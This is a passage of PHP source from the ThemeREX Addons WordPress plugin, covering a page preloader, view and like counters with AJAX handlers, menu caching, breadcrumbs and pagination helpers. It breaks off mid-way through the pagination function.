<?php
/**
 * WordPress utilities
 *
 * @package WordPress
 * @subpackage ThemeREX Addons
 * @since v1.0
 */

// Don't load directly
if ( ! defined( 'TRX_ADDONS_VERSION' ) ) {
	die( '-1' );
}


/* Page preloader
------------------------------------------------------------------------------------- */

// Add plugin specific classes to the body tag
if ( !function_exists('trx_addons_body_classes') ) {
	add_filter( 'body_class', 'trx_addons_body_classes' );
	function trx_addons_body_classes( $classes ) {
		if (!trx_addons_is_off(trx_addons_get_option('page_preloader')))
			$classes[] = 'preloader';
		if (is_front_page() && get_option('show_on_front')=='page' && get_option('page_on_front')>0)
			$classes[] = 'frontpage';
		return $classes;
	}
}

// Add page preloader into body
if (!function_exists('trx_addons_add_page_preloader')) {
	add_action('wp_footer', 'trx_addons_add_page_preloader', 1);
	function trx_addons_add_page_preloader() {
		if ( ($preloader=trx_addons_get_option('page_preloader')) != 'none' && ( $preloader != 'custom' || ($image=trx_addons_get_option('page_preloader_image')) != '')) {
			?><div id="page_preloader"><?php
				if ($preloader == 'circle') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_circ1"></div><div class="preloader_circ2"></div><div class="preloader_circ3"></div><div class="preloader_circ4"></div></div><?php
				} else if ($preloader == 'square') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_square1"></div><div class="preloader_square2"></div></div><?php
				}
			?></div><?php
		}
	}
}

// Add page preloader styles into head
if (!function_exists('trx_addons_add_page_preloader_styles')) {
	add_action('wp_head', 'trx_addons_add_page_preloader_styles');
	function trx_addons_add_page_preloader_styles() {
		if (($preloader=trx_addons_get_option('page_preloader'))!='none') {
			$image = trx_addons_get_option('page_preloader_image');
			$bg_color = trx_addons_get_option('page_preloader_bg_color');
			if (!empty($bg_color)) $bg_color = 'background-color:' . esc_attr($bg_color) . ';';
			?>
			<style type="text/css">
			<!--
				#page_preloader {
					<?php
					if (!empty($bg_color)) {
						?>background-color: <?php echo esc_attr($bg_color); ?>;<?php
					}
					if ($preloader=='custom' && $image) {
						?>background-image: url(<?php echo esc_url($image); ?>);<?php
					}
					?>
				}
			-->
			</style>
			<?php
		}
	}
}



/* Scroll to top button
------------------------------------------------------------------------------------- */

// Add button into body
if (!function_exists('trx_addons_add_scroll_to_top')) {
	add_action('wp_footer', 'trx_addons_add_scroll_to_top', 100);
	function trx_addons_add_scroll_to_top() {
		if (trx_addons_is_on(trx_addons_get_option('scroll_to_top'))) {
			?><a href="#" class="trx_addons_scroll_to_top trx_addons_icon-up" title="<?php esc_attr_e('Scroll to top', 'trx_addons'); ?>"></a><?php
		}
	}
}



/* Post views and likes
-------------------------------------------------------------------------------- */

//Return Post Views number
if (!function_exists('trx_addons_get_post_views')) {
	function trx_addons_get_post_views($id=0){
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_views_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Post Views number
if (!function_exists('trx_addons_set_post_views')) {
	function trx_addons_set_post_views($id=0, $counter=-1) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_views_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_post_meta($id, $count_key, $count);
		}
	}
}

// Increment Post Views number
if (!function_exists('trx_addons_inc_post_views')) {
	function trx_addons_inc_post_views($id=0, $inc=0) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_views_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			$count = max(0, $inc);
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, $count);
		} else {
			$count += $inc;
			update_post_meta($id, $count_key, $count);
		}
		return $count;
	}
}

//Return Post Likes number
if (!function_exists('trx_addons_get_post_likes')) {
	function trx_addons_get_post_likes($id=0){
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Post Likes number
if (!function_exists('trx_addons_set_post_likes')) {
	function trx_addons_set_post_likes($id=0, $counter=-1) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_post_meta($id, $count_key, $count);
		}
	}
}

// Increment Post Likes number
if (!function_exists('trx_addons_inc_post_likes')) {
	function trx_addons_inc_post_likes($id=0, $inc=0) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = 'trx_addons_post_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			$count = max(0, $inc);
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, $count);
		} else {
			$count += $inc;
			update_post_meta($id, $count_key, $count);
		}
		return $count;
	}
}


// Set post likes/views counters when save/publish post
if ( !function_exists( 'trx_addons_init_post_counters' ) ) {
	add_action('save_post',	'trx_addons_init_post_counters');
	function trx_addons_init_post_counters($id) {
		global $post_type, $post;
		// check autosave
		if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			return $id;
		}
		// check permissions
		if (empty($post_type) || !current_user_can('edit_'.$post_type, $id)) {
			return $id;
		}
		if ( !empty($post->ID) && $id==$post->ID ) {
			trx_addons_get_post_views($id);
			trx_addons_get_post_likes($id);
		}
	}
}


// AJAX: Set post likes/views number
if ( !function_exists( 'trx_addons_callback_post_counter' ) ) {
	add_action('wp_ajax_post_counter', 			'trx_addons_callback_post_counter');
	add_action('wp_ajax_nopriv_post_counter',	'trx_addons_callback_post_counter');
	function trx_addons_callback_post_counter() {
		
		if ( !wp_verify_nonce( trx_addons_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_post_likes($id, (int) $_REQUEST['likes']);
		} else if (isset($_REQUEST['views'])) {
			$response['counter'] = trx_addons_inc_post_views($id, (int) $_REQUEST['views']);
		}
		echo json_encode($response);
		die();
	}
}


// Add post/page views counter feature
if (!function_exists('trx_addons_add_post_views_counter')) {
	add_action('wp_footer', 'trx_addons_add_post_views_counter');
	function trx_addons_add_post_views_counter() {
		if (!is_singular()) return;
		if (($fdir = trx_addons_get_file_dir('templates/tpl.post-views-counter.php')) != '') {
			require_once $fdir;
		}
	}
}

// Return post likes/views counter layout
if ( !function_exists( 'trx_addons_get_post_counters' ) ) {
	function trx_addons_get_post_counters($counters='views', $show=false) {
		$post_id = get_the_ID();
		$output = '';
		if (strpos($counters, 'comments')!==false && (!is_singular() || have_comments() || comments_open())) {
			$post_comments = get_comments_number();
			$output .= ' <a href="'.esc_url(get_comments_link()).'" class="post_counters_item post_counters_comments trx_addons_icon-comment">'
							. '<span class="post_counters_number">'	. trim($post_comments) . '</span>'
							. '<span class="post_counters_label">' . (1==$post_comments ? esc_html__('Comment', 'trx_addons') : esc_html__('Comments', 'trx_addons')) . '</span>'
						.'</a> ';
		}
		if (strpos($counters, 'views')!==false) {
			$post_views = trx_addons_get_post_views($post_id);
			$output .= ' <a href="' . esc_url(get_permalink()) . '" class="post_counters_item post_counters_views trx_addons_icon-eye">'
							. '<span class="post_counters_number">' . trim($post_views) . '</span>'
							. '<span class="post_counters_label">' . (1==$post_views ? esc_html__('View', 'trx_addons') : esc_html__('Views', 'trx_addons')) . '</span>'
						. '</a> ';
		}
		if (strpos($counters, 'likes')!==false) {
			$post_likes = trx_addons_get_post_likes($post_id);
			$likes = isset($_COOKIE['trx_addons_likes']) ? $_COOKIE['trx_addons_likes'] : '';
			$allow = strpos($likes, ','.($post_id).',')===false;
			$output .= ' <a href="#" class="post_counters_item post_counters_likes trx_addons_icon-heart'.(!empty($allow) ? '-empty enabled' : ' disabled').'"
				title="'.(!empty($allow) ? esc_attr__('Like', 'trx_addons') : esc_attr__('Dislike', 'trx_addons')).'"
				data-postid="' . esc_attr($post_id) . '"
				data-likes="' . esc_attr($post_likes) . '"
				data-title-like="' . esc_attr__('Like', 'trx_addons') . '"
				data-title-dislike="' . esc_attr__('Dislike', 'trx_addons') . '">'
					. '<span class="post_counters_number">' . trim($post_likes) . '</span>'
					. '<span class="post_counters_label">' . (1==$post_likes ? esc_html__('Like', 'trx_addons') : esc_html__('Likes', 'trx_addons')) . '</span>'
				. '</a> ';
		}
		if ($show) echo trim($output);
		return $output;
	}
}



/* Comment's likes
-------------------------------------------------------------------------------- */

//Return Comment's Likes number
if (!function_exists('trx_addons_get_comment_likes')) {
	function trx_addons_get_comment_likes($id=0){
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $count_key, true);
		if ($count===''){
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Comment's Likes number
if (!function_exists('trx_addons_set_comment_likes')) {
	function trx_addons_set_comment_likes($id=0, $counter=-1) {
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_comment_meta($id, $count_key, $count);
		}
	}
}

// Increment Post Likes number
if (!function_exists('trx_addons_inc_comment_likes')) {
	function trx_addons_inc_comment_likes($id=0, $inc=0) {
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $count_key, true);
		if ($count===''){
			$count = max(0, $inc);
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, $count);
		} else {
			$count += $inc;
			update_comment_meta($id, $count_key, $count);
		}
		return $count;
	}
}


// Set comment likes counter when save/publish post
if ( !function_exists( 'trx_addons_init_comment_counters' ) ) {
	add_action('comment_post',	'trx_addons_init_comment_counters', 10, 2);
	function trx_addons_init_comment_counters($id, $status='') {
		if ( !empty($id) ) {
			trx_addons_get_comment_likes($id);
		}
	}
}


// AJAX: Set comment likes number
if ( !function_exists( 'trx_addons_callback_comment_counter' ) ) {
	add_action('wp_ajax_comment_counter', 		'trx_addons_callback_comment_counter');
	add_action('wp_ajax_nopriv_comment_counter','trx_addons_callback_comment_counter');
	function trx_addons_callback_comment_counter() {
		
		if ( !wp_verify_nonce( trx_addons_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_comment_likes($id, (int) $_REQUEST['likes']);
		}
		echo json_encode($response);
		die();
	}
}


// Return post likes/views counter layout
if ( !function_exists( 'trx_addons_get_comment_counters' ) ) {
	function trx_addons_get_comment_counters($counters='likes', $show=false) {
		$comment_id = get_comment_ID();
		$output = '';
		if (strpos($counters, 'likes')!==false) {
			$comment_likes = trx_addons_get_comment_likes($comment_id);
			$likes = isset($_COOKIE['trx_addons_comment_likes']) ? $_COOKIE['trx_addons_comment_likes'] : '';
			$allow = strpos($likes, ','.($comment_id).',')===false;
			$output .= '<a href="#" class="comment_counters_item comment_counters_likes trx_addons_icon-heart'.(!empty($allow) ? '-empty enabled' : ' disabled').'"
				title="'.(!empty($allow) ? esc_attr__('Like', 'trx_addons') : esc_attr__('Dislike', 'trx_addons')).'"
				data-commentid="' . esc_attr($comment_id) . '"
				data-likes="' . esc_attr($comment_likes) . '"
				data-title-like="' . esc_attr__('Like', 'trx_addons') . '"
				data-title-dislike="' . esc_attr__('Dislike', 'trx_addons') . '">'
					. '<span class="comment_counters_number">' . trim($comment_likes) . '</span>'
					. '<span class="comment_counters_label">' . esc_html__('Likes', 'trx_addons') . '</span>'
				. '</a>';
		}
		if ($show) echo trim($output);
		return $output;
	}
}
		



/* Widgets utilities
------------------------------------------------------------------------------------- */

// Prepare widgets args - substitute id and class in parameter 'before_widget'
if (!function_exists('trx_addons_prepare_widgets_args')) {
	function trx_addons_prepare_widgets_args($args, $id, $class) {
		if (!empty($args['before_widget'])) $args['before_widget'] = str_replace(array('%1$s', '%2$s'), array($id, $class), $args['before_widget']);
		return $args;
	}
}
		



/* Menu utilities
------------------------------------------------------------------------------------- */

// Return nav menu html
if ( !function_exists( 'trx_addons_get_nav_menu' ) ) {
	function trx_addons_get_nav_menu($location='', $menu='', $depth=11, $custom_walker=false) {
		static $list = array();
		$slug = $location.'_'.$menu;
		if (empty($list[$slug])) {
			$args = array(
					'menu'				=> empty($menu) || $menu=='default' || trx_addons_is_inherit($menu) ? '' : $menu,
					'container'			=> '',
					'container_class'	=> '',
					'container_id'		=> '',
					'items_wrap'		=> '<ul id="%1$s" class="%2$s">%3$s</ul>',
					'menu_class'		=> 'sc_layouts_menu_nav' . (!empty($location) ? ' '.$location.'_nav' : ''),
					'menu_id'			=> (!empty($location) ? $location : ''),
					'echo'				=> false,
					'fallback_cb'		=> '',
					'before'			=> '',
					'after'				=> '',
					'link_before'       => '<span>',
					'link_after'        => '</span>',
					'depth'             => $depth
					);
			if (!empty($location))
				$args['theme_location'] = $location;
			if ($custom_walker && class_exists('trx_addons_custom_menu_walker'))
				$args['walker'] = new trx_addons_custom_menu_walker;
			// Remove empty spaces between items
			$list[$slug] = preg_replace(array("/>[\r\n\s]*<li/", "/>[\r\n\s]*<\\/ul>/"),
										array("><li", "></ul>"),
										wp_nav_menu(apply_filters('trx_addons_filter_get_nav_menu_args', $args))
										);
		}
		return apply_filters('trx_addons_filter_get_nav_menu', $list[$slug], $location, $menu);
	}
}

// Add menu to the cache
if ( !function_exists( 'trx_addons_add_menu_cache' ) ) {
	add_action('wp_nav_menu', 'trx_addons_add_menu_cache', 100, 2);
	function trx_addons_add_menu_cache($html='', $args=array()) {
		if (trx_addons_is_on(trx_addons_get_option('menu_cache')) && !trx_addons_exists_wpml()) {
			$menu_cache = 'trx_addons_menu_'.get_option('stylesheet');
			$list = get_transient($menu_cache);
			if (empty($list)) $list = array();
			$menu = !empty($args->theme_location) 
						? $args->theme_location 
						: (!empty($args->menu) 
								? (!empty($args->menu->slug)
										? $args->menu->slug
										: $args->menu
									)
								: 'default'
							);
			$list[$menu] = $html;
			set_transient($menu_cache, $list, 24*60*60);
		}
		return $html;
	}
}

// Clear cache with saved menu
if ( !function_exists( 'trx_addons_clear_menu_cache' ) ) {
	add_action('wp_update_nav_menu', 'trx_addons_clear_menu_cache', 10, 2);
	function trx_addons_clear_menu_cache($menu_id=0, $menu_data=array()) {
		delete_transient('trx_addons_menu_'.get_option('stylesheet'));
	}
}

// Return menu from the cache
if ( !function_exists( 'trx_addons_get_menu_cache' ) ) {
	add_action('pre_wp_nav_menu', 'trx_addons_get_menu_cache', 100, 2);
	function trx_addons_get_menu_cache($html, $args) {
		if (trx_addons_is_on(trx_addons_get_option('menu_cache')) && !trx_addons_exists_wpml()) {
			$menu_cache = 'trx_addons_menu_'.get_option('stylesheet');
			$list = get_transient($menu_cache);
			$menu = !empty($args->theme_location) 
						? $args->theme_location
						: (!empty($args->menu) 
								? (!empty($args->menu->slug)
										? $args->menu->slug
										: $args->menu
									)
								: 'default'
							);
			if (!empty($list[$menu])) {
				$html = $list[$menu];
				global $TRX_ADDONS_STORAGE;
				if (!isset($TRX_ADDONS_STORAGE['menu_cache'])) $TRX_ADDONS_STORAGE['menu_cache'] = array();
				$TRX_ADDONS_STORAGE['menu_cache'][] = !empty($args->menu_id) ? '#'.esc_attr($args->menu_id) : '.'.esc_attr($args->menu_class);
			}
		}
		return $html;
	}
}

// Add cached menu selectors to the js vars
if ( !function_exists( 'trx_addons_add_menu_cache_to_js' ) ) {
	add_filter('trx_addons_localize_script', 'trx_addons_add_menu_cache_to_js');
	function trx_addons_add_menu_cache_to_js($vars) {
		global $TRX_ADDONS_STORAGE;
		$vars['menu_cache'] = apply_filters('trx_addons_filter_menu_cache', !empty($TRX_ADDONS_STORAGE['menu_cache']) ? $TRX_ADDONS_STORAGE['menu_cache'] : array());
		return $vars;
	}
}



/* Breadcrumbs
------------------------------------------------------------------------------------- */

// Action handler to show breadcrumbs
if (!function_exists('trx_addons_action_breadcrumbs')) {
	add_action( 'trx_addons_action_breadcrumbs', 'trx_addons_action_breadcrumbs', 10, 2);
	function trx_addons_action_breadcrumbs($before='', $after='') {
		if (($fdir = trx_addons_get_file_dir('templates/tpl.breadcrumbs.php')) != '') {
			include $fdir;
		}
	}
}

// Show breadcrumbs path
if (!function_exists('trx_addons_get_breadcrumbs')) {
	function trx_addons_get_breadcrumbs($args=array()) {
		global $wp_query, $post;
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'trx_addons'),		// Home page title (if empty - not showed)
			'home_link' => '',								// Home page link
			'truncate_title' => 50,					// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',				// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',		// Delimiter between breadcrumbs items
			'max_levels' => trx_addons_get_option('breadcrumbs_max_level')		// Max categories in the path (0 - unlimited)
			), is_array($args) ? $args : array( 'home' => $args )
		);

		if ( is_front_page() ) return '';//is_home() || 

		if ( $args['max_levels']<=0 ) $args['max_levels'] = 999;

		$need_reset = true;
		$rez = $rez_parent = $rez_level = '';
		$cat = $parent_tax = '';
		$level = $parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if (is_page() || is_attachment() || is_single()) {
			$page_parent_id = apply_filters('trx_addons_filter_get_parent_id', isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0, isset($wp_query->post->ID) ? $wp_query->post->ID : 0);
			$post_id = (is_attachment() ? $page_parent_id : (isset($wp_query->post->ID) ? $wp_query->post->ID : 0));
			while ($page_parent_id > 0) {
				$page_parent = get_post($page_parent_id);
				$level++;
				if ($level > $args['max_levels'])
					$rez_level = '...';
				else
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . get_permalink($page_parent->ID) . '">' 
									. esc_html(trx_addons_strshort($page_parent->post_title, $args['truncate_title'], $args['truncate_add']))
									. '</a>' 
									. (!empty($rez_parent) ? $args['delimiter'] : '') 
									. ($rez_parent);
				if (($page_parent_id = apply_filters('trx_addons_filter_get_parent_id', $page_parent->post_parent, $page_parent_id)) > 0) $post_id = $page_parent_id;
			}
		}
		
		// Show parents
		$step = 0;
		do {
			if ($step++ == 0) {
				if (is_single() || is_attachment()) {
					$post_type = get_post_type();
					if ($post_type == 'post') {
						$cats = get_the_category();
						$cat = !empty($cats[0]) ? $cats[0] : false;
					} else {
						$tax = trx_addons_get_post_type_taxonomy($post_type);
						if (!empty($tax)) {
							$cats = get_the_terms(get_the_ID(), $tax);
							$cat = !empty($cats[0]) ? $cats[0] : false;
						}
					}
					if ($cat) {
						$level++;
						if ($level > $args['max_levels'])
							$rez_level = '...';
						else
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url(get_category_link($cat->term_id)).'">' 
											. esc_html(trx_addons_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
					}
				} else if ( is_category() ) {
					$cat_id = (int) get_query_var( 'cat' );
					if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
					$cat = get_term_by( (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( is_tag() ) {
					$cat = get_term_by( 'slug', get_query_var( 'post_tag' ), 'post_tag', OBJECT);
				} else if ( is_tax() ) {
					$tax = get_query_var('taxonomy');
					$cat = get_term_by( 'slug', get_query_var( $tax ), $tax, OBJECT);
				}
				if ($cat) {
					$parent = $cat->parent;
					$parent_tax = $cat->taxonomy;
				}
			}
			if ($parent) {
				$cat = get_term_by( 'id', $parent, $parent_tax, OBJECT);
				if ($cat) {
					$cat_link = get_term_link($cat->slug, $cat->taxonomy);
					$level++;
					if ($level > $args['max_levels'])
						$rez_level = '...';
					else
						$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
										. esc_html(trx_addons_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
										. '</a>' 
										. (!empty($rez_parent) ? $args['delimiter'] : '') 
										. ($rez_parent);
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		$rez_period = '';
		if ((is_day() || is_month()) && is_object($post)) {
			$year  = get_the_time('Y'); 
			$month = get_the_time('m'); 
			$rez_period = '<a class="breadcrumbs_item cat_parent" href="' . get_year_link( $year ) . '">' . ($year) . '</a>';
			if (is_day())
				$rez_period .= (!empty($rez_period) ? $args['delimiter'] : '') . '<a class="breadcrumbs_item cat_parent" href="' . esc_url(get_month_link( $year, $month )) . '">' . esc_html(get_the_date('F')) . '</a>';
		}
		
		// Get link to the 'All posts (products, events, etc.)' page
		$rez_all = apply_filters('trx_addons_filter_get_blog_all_posts_link', '');

		if (!is_front_page()) {	// && !is_home()

			$title = trx_addons_get_blog_title();
			if (is_array($title)) $title = $title['text'];
			$title = trx_addons_strshort($title, $args['truncate_title'], $args['truncate_add']);

			$rez .= (isset($args['home']) && $args['home']!='' 
					? '<a class="breadcrumbs_item home" href="' . esc_url($args['home_link'] ? $args['home_link'] : home_url('/')) . '">' . ($args['home']) . '</a>' . ($args['delimiter']) 
					: '') 
				. (!empty($rez_all)    ? ($rez_all)    . ($args['delimiter']) : '')
				. (!empty($rez_level)  ? ($rez_level)  . ($args['delimiter']) : '')
				. (!empty($rez_parent) ? ($rez_parent) . ($args['delimiter']) : '')
				. (!empty($rez_period) ? ($rez_period) . ($args['delimiter']) : '')
				. ($title ? '<span class="breadcrumbs_item current">' . ($title) . '</span>' : '');
		}

		return apply_filters('trx_addons_filter_get_breadcrumbs', $rez);
	}
}

// Return link to the main posts page for the breadcrumbs
if ( !function_exists( 'trx_addons_get_blog_all_posts_link' ) ) {
	add_filter( 'trx_addons_filter_get_blog_all_posts_link', 'trx_addons_get_blog_all_posts_link');
	function trx_addons_get_blog_all_posts_link($link='') {
		if ($link=='') {
			if (trx_addons_is_posts_page() && !is_home())	//!is_post_type_archive('post'))
				$link = '<a href="'.esc_url(get_post_type_archive_link( 'post' )).'">'.esc_html__('All Posts', 'trx_addons').'</a>';
		}
		return $link;
	}
}

// Return true if it's 'posts' page
if ( !function_exists( 'trx_addons_is_posts_page' ) ) {
	function trx_addons_is_posts_page() {
		return !is_search()
					&& (
						(is_single() && get_post_type()=='post')
						|| is_category()
						);
	}
}

// Return blog title
if (!function_exists('trx_addons_get_blog_title')) {
	function trx_addons_get_blog_title() {
		if (is_front_page())
			$title = esc_html__( 'Home', 'trx_addons' );
		else if ( is_home() )
			$title = esc_html__( 'All Posts', 'trx_addons' );
		else if ( is_author() ) {
			$curauth = (get_query_var('author_name')) ? get_user_by('slug', get_query_var('author_name')) : get_userdata(get_query_var('author'));
			$title = sprintf(esc_html__('Author page: %s', 'trx_addons'), $curauth->display_name);
		} else if ( is_404() )
			$title = esc_html__('URL not found', 'trx_addons');
		else if ( is_search() )
			$title = sprintf( esc_html__( 'Search: %s', 'trx_addons' ), get_search_query() );
		else if ( is_day() )
			$title = sprintf( esc_html__( 'Daily Archives: %s', 'trx_addons' ), get_the_date() );
		else if ( is_month() )
			$title = sprintf( esc_html__( 'Monthly Archives: %s', 'trx_addons' ), get_the_date( 'F Y' ) );
		else if ( is_year() )
			$title = sprintf( esc_html__( 'Yearly Archives: %s', 'trx_addons' ), get_the_date( 'Y' ) );
		 else if ( is_category() )
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_cat_title( '', false ) );
		else if ( is_tag() )
			$title = sprintf( esc_html__( 'Tag: %s', 'trx_addons' ), single_tag_title( '', false ) );
		else if ( is_tax() )
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_term_title( '', false ) );
		else if ( is_attachment() )
			$title = sprintf( esc_html__( 'Attachment: %s', 'trx_addons' ), get_the_title());
		else if ( is_single() || is_page() )
			$title = get_the_title();
		else
			$title = get_the_title();	//get_bloginfo('name', 'raw');
		return apply_filters('trx_addons_filter_get_blog_title', $title);
	}
}



/* Blog pagination
------------------------------------------------------------------------------------- */

// Show simple pagination
if ( !function_exists('trx_addons_show_pagination') ) {
	function trx_addons_show_pagination($pagination='pages') {
		global $wp_query;
		// Pagination
		if ($pagination == 'pages') {
			the_posts_pagination( array(
				'mid_size'  => 2,
				'prev_text' => esc_html__( '<', 'trx_addons' ),
				'next_text' => esc_html__( '>', 'trx_addons' ),
				'before_page_number' => '<span class="meta-nav screen-reader-text">' . esc_html__( 'Page', 'trx_addons' ) . ' </span>',
			) );
		} else if ($pagination == 'links') {
			?>
			<div class="nav-links-old">
				<span class="nav-prev"><?php previous_posts_link( is_search() ? esc_html__('Previous posts', 'trx_addons') : esc_html__('Newest posts', 'trx_addons') ); ?></span>
				<span class="nav-next"><?php next_posts_link( is_search() ? esc_html__('Next posts', 'trx_addons') : esc_html__('Older posts', 'trx_addons'), $wp_query->max_num_pages ); ?></span>
			</div>
			<?php
		}
	}
}

// Show pagination with group pages: [1-10][11-20]...[24][25][26]...[31-40][41-45]
if (!function_exists('trx_addons_pagination')) {
	function trx_addons_pagination($args=array()) {
		$args = array_merge(array(
			'class' => '',				// Additional 'class' attribute for the pagination section
			'button_class' => '',		// Additional 'class' attribute for the each page button
			'base_link' => '',			// Base link for each page. If specified - all pages use it and add '&page=XX' to the end of this link. Else - use get_pagenum_link()
			'total_posts' => 0,			// Total posts number
			'posts_per_page' => 0,		// Posts per page
			'total_pages' => 0,			// Total pages (instead total_posts, otherwise - calculate number of pages)
			'cur_page' => 0,			// Current page
			'near_pages' => 2,			// Number of pages to be displayed before and after the current page
			'group_pages' => 10,		// How many pages in group
			'pages_text' => '', 		//__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'trx_addons'),
			'cur_text' => "%PAGE_NUMBER%",
			'page_text' => "%PAGE_NUMBER%",
			'first_text'=> __('&laquo; First', 'trx_addons'),
			'last_text' => __("Last &raquo;", 'trx_addons'),
			'prev_text' => __("&laquo; Prev", 'trx_addons'),
			'next_text' => __("Next &raquo;", 'trx_addons'),
			'dot_text' => "&hellip;",
			'before' => '',
			'after' => ''
			),  is_array($args) ? $args 
				: (is_int($args) ? array( 'cur_page' => $args ) 		// If send number parameter - use it as offset
					: array( 'class' => $args )));						// If send string parameter - use it as 'class' name
		if (empty($args['before']))	$args['before'] = '<div class="trx_addons_pagination'.(!empty($args['class']) ? ' '.$args['class'] : '').'">';
		if (empty($args['after'])) 	$args['after'] = '</div>';
		
		extract($args);
		
		global $wp_query;
	
		// Detect total pages
		if ($total_pages == 0) {
			if ($total_posts == 0) $total_posts = $wp_query->found_posts;
			if ($posts_per_page == 0) $posts_per_page = (int) get_query_var('posts_per_page');
			$total_pages = ceil($total_posts / $posts_per_page);
		}
		
		if ($total_pages < 2) return;
		
		// Detect current page
		if ($cur_page == 0) {
			$cur_page = (int) get_query_var('paged');
			if ($cur_page == 0) $cur_page = (int) get_query_var('page');
			if ($cur_page <= 0) $cur_page = 1;
		}
		// Near pages
		$show_pages_start = $cur_page - $near_pages;
		$show_pages_end = $cur_page + $near_pages;
		// Current group
		$cur_group = ceil($cur_page / $group_pages);
	
		$output = $before;
	
		// Page XX from XXX
		if ($pages_text) {
			$pages_text = str_replace(
				array("%CURRENT_PAGE%", "%TOTAL_PAGES%"),
				array(number_format_i18n($cur_page),number_format_i18n($total_pages)),
				$pages_text);
			$output .= '<span class="'.esc_attr($class).'_pages '.$button_class.'">' . $pages_text . '</span>';
		}
		if ($cur_page > 1) {
			// First page
			$first_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $first_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page=1' : get_pagenum_link()).'" data-page="1" class="'.esc_attr($class).'_first '.$button_class.'">'.$first_text.'</a>';
			// Prev page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page-1) : get_pagenum_link($cur_page-1)).'" data-page="'.esc_attr($cur_page-1).'" class="'.esc_attr($class).'_prev '.$button_class.'">'.$prev_text.'</a>';
		}
		// Page buttons
		$group = 1;
		$dot1 = $dot2 = false;
		for ($i = 1; $i <= $total_pages; $i++) {
			if ($i % $group_pages == 1) {
				$group = ceil($i / $group_pages);
				if ($group != $cur_group)
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.$i : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.esc_attr($class).'_group '.$button_class.'">'.$i.'-'.min($i+$group_pages-1, $total_pages).'</a>';
			}
			if ($group == $cur_group) {
				if ($i < $show_pages_start) {
					if (!$dot1) {
